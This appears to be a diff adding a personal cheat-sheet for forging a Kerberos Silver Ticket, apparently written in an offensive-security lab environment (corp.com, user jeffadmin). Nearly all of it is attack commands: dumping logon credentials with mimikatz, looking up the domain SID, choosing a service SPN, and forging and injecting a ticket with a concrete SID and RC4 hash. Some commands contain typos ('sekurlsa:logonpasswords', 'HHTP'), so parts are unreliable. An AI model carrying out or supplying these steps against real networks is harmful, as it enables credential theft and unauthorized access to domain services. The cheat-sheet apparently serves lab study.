@@ -1,0 +1,18 @@
+#Silver Ticket
+1. SPN password hash
+iwr -UseDefaultCredentials http://web01
+mimikatz.exe 
+privilege::debug
+sekurlsa:logonpasswords
+
+2. Domain SID
+whoami /user
+#user doamin without last 4 nums
+
+3. Target SPN
+#Target SPN
+HHTP/web04.domain.com:80
+
+4. Create Silver Ticket
+mimikatz.exe
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
